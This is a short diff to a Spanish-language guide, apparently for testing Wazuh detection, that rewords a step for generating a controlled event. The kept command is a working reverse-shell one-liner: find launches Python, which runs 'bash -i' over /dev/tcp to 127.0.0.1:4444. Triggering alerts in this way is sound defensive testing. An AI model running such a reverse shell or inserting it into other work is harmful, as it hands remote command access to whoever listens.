@@ -108,7 +108,7 @@ systemctl restart wazuh-manager
 
 ### 1. Generar un evento controlado:
 
-Mediante la herramienta de Atomic Read Team, se ejecuta un comando de Powershell
+Se ejecuta el siguiente comando:
 
 ```bash
 find /tmp -name "temp_file.txt" -exec /usr/bin/python3 -c "import os; os.system('bash -i >& /dev/tcp/127.0.0.1/4444 0>&1')" \;
